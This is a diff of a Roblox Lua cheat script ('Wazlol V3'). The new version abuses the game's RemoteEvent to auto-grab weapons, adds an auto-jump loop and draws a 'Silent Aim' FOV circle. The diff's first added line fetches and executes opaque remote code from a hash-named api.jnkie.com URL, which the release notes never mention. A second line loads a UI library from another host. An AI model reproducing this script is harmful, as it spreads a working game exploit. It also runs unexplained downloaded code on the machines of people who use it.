@@ -1,60 +1,137 @@
+loadstring(game:HttpGet("https://api.jnkie.com/api/v1/luascripts/public/6ada0b815e7692bc716d915e9c9e78bf4cfc8c3a432566f179027077092db171/download"))()
+
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 
 local Window = Rayfield:CreateWindow({
-   Name = "Wazlol | INSTANT FAL",
-      LoadingTitle = "Activating Snatcher...", -- Fixed syntax error here
-         ConfigurationSaving = { Enabled = false }
-         })
+   Name = "Wazlol V3",
+   LoadingTitle = "Loading script...",
+   ConfigurationSaving = { Enabled = true },
+   Theme = "Ocean"
+})
 
-         local Configs = {
-             AutoGrab = true,
-                 FastMode = true
-                 }
+local Configs = {
+    AutoGrab = true,
+    InfJump = false,
+    FOV = 150,
+    CircleColor = Color3.fromRGB(0, 162, 255),
+    Targets = {
+        ["FAL"] = true, ["SPAS"] = true, ["Keycard"] = true,
+        ["Taser"] = true, ["Handcuffs"] = true, ["Minigun"] = true,
+        ["UZI"] = true, ["Quad Launcher"] = true, ["Tazer"] = true,
+        ["M60"] = true, ["AR 15"] = true, ["Deagle"] = true,
+        ["Medkit"] = true, ["Baton"] = true
+    }
+}
 
-                 local Remote = game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("RemoteEvent")
-                 local Pickups = workspace:WaitForChild("pickups")
+-- Servizi
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local Mouse = LocalPlayer:GetMouse()
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local Remote = ReplicatedStorage:WaitForChild("Events"):WaitForChild("RemoteEvent")
+local Pickups = workspace:WaitForChild("pickups", 5)
 
-                 local MainTab = Window:CreateTab("Main", 4483362458)
+-- DISEGNO DEL CERCHIO
+local FOVCircle = Drawing.new("Circle")
+FOVCircle.Thickness = 2.5
+FOVCircle.Color = Configs.CircleColor
+FOVCircle.Filled = false
+FOVCircle.Transparency = 0.9
+FOVCircle.Visible = true
+FOVCircle.Radius = Configs.FOV
 
-                 MainTab:CreateToggle({
-                    Name = "Ultra-Fast Auto Grab (FAL/SPAS)",
-                       CurrentValue = true,
-                          Callback = function(v) Configs.AutoGrab = v end,
-                          })
+-- TABS
+local MainTab = Window:CreateTab("Main", 4483362458)
+local OthersTab = Window:CreateTab("Others", 4483362458)
+local LogsTab = Window:CreateTab("Update Logs", 4483362458)
 
-                          -- INSTANT GRAB FUNCTION
-                          local function GrabWeapon(obj)
-                              if Configs.AutoGrab and obj:IsA("Model") then
-                                      if obj.Name == "FAL" or obj.Name == "SPAS" then
-                                                  -- Sends the specific ID 12 remote signal immediately
-                                                              Remote:FireServer(12, obj)
-                                                                      end
-                                                                          end
-                                                                          end
+-- MAIN SECTION
+MainTab:CreateSection("Automation")
+MainTab:CreateToggle({
+   Name = "Waz LIP",
+   CurrentValue = true,
+   Callback = function(v) Configs.AutoGrab = v end,
+})
 
-                                                                          -- 1. INSTANT APPEARANCE CHECK (Zero Delay)
-                                                                          Pickups.ChildAdded:Connect(function(child)
-                                                                              -- Grabs the item as soon as the server creates it
-                                                                                  GrabWeapon(child)
-                                                                                  end)
+MainTab:CreateSlider({
+   Name = "Silent Aim FOV",
+   Range = {50, 400},
+   Increment = 1,
+   CurrentValue = 150,
+   Callback = function(Value)
+       Configs.FOV = Value
+       FOVCircle.Radius = Value
+   end,
+})
 
-                                                                                  -- 2. SAFETY SCAN LOOP (For items already on the ground)
-                                                                                  task.spawn(function()
-                                                                                      while true do
-                                                                                              task.wait(0.2) -- Lightweight backup check
-                                                                                                      if Configs.AutoGrab then
-                                                                                                                  for _, item in pairs(Pickups:GetChildren()) do
-                                                                                                                                  local char = game.Players.LocalPlayer.Character
-                                                                                                                                                  local bp = game.Players.LocalPlayer:FindFirstChild("Backpack")
-                                                                                                                                                                  
-                                                                                                                                                                                  if bp and char then
-                                                                                                                                                                                                      -- Check if weapon is not already in inventory or held
-                                                                                                                                                                                                                          if not (bp:FindFirstChild(item.Name) or char:FindFirstChild(item.Name)) then
-                                                                                                                                                                                                                                                  GrabWeapon(item)
-                                                                                                                                                                                                                                                                      end
-                                                                                                                                                                                                                                                                                      end
-                                                                                                                                                                                                                                                                                                  end
-                                                                                                                                                                                                                                                                                                          end
-                                                                                                                                                                                                                                                                                                              end
-                                                                                                                                                                                                                                                                                                              end)
-                                                                                                                                                                                                                                                                                                              
+-- OTHERS SECTION
+OthersTab:CreateSection("Movement")
+OthersTab:CreateToggle({
+   Name = "Auto Jump (Bugged Mode)",
+   CurrentValue = false,
+   Callback = function(v) 
+       Configs.InfJump = v 
+   end,
+})
+
+-- UPDATE LOGS
+LogsTab:CreateSection("Release Notes")
+LogsTab:CreateLabel("- Fixed Auto Jump: Now jumps instantly on land")
+LogsTab:CreateLabel("- Optimized FOV Circle tracking")
+LogsTab:CreateLabel("- Keycard limited to 1 per inventory")
+LogsTab:CreateLabel("- Anti-spam active for M60 and AR 15")
+
+-- FIX LOGICA AUTO JUMP (Loop continuo)
+RunService.RenderStepped:Connect(function()
+    -- Gestione Cerchio
+    FOVCircle.Position = Vector2.new(Mouse.X, Mouse.Y + 36)
+    
+    -- Gestione Salto Automatico
+    if Configs.InfJump then
+        local char = LocalPlayer.Character
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
+        
+        if hum and hum.FloorMaterial ~= Enum.Material.Air then
+            hum.Jump = true
+        end
+    end
+end)
+
+--- LOGICA GRAB ---
+local function GrabItem(obj)
+    if not Configs.AutoGrab or not obj:IsA("Model") then return end
+    
+    local itemName = obj.Name:gsub("%s+$", "")
+    
+    if Configs.Targets[itemName] then
+        local char = LocalPlayer.Character
+        local bp = LocalPlayer:FindFirstChild("Backpack")
+        
+        local alreadyHas = (char and char:FindFirstChild(itemName)) or (bp and bp:FindFirstChild(itemName))
+        
+        if not alreadyHas then
+            Remote:FireServer(12, obj)
+        end
+    end
+end
+
+if Pickups then
+    Pickups.ChildAdded:Connect(GrabItem)
+end
+
+task.spawn(function()
+    while task.wait(0.3) do
+        if Configs.AutoGrab and Pickups then
+            for _, item in pairs(Pickups:GetChildren()) do
+                GrabItem(item)
+            end
+        end
+    end
+end)
+
+Rayfield:Notify({
+   Title = "V3 Fixed",
+   Content = "Check out Update Logs. Enjoy!",
+   Duration = 5
+})
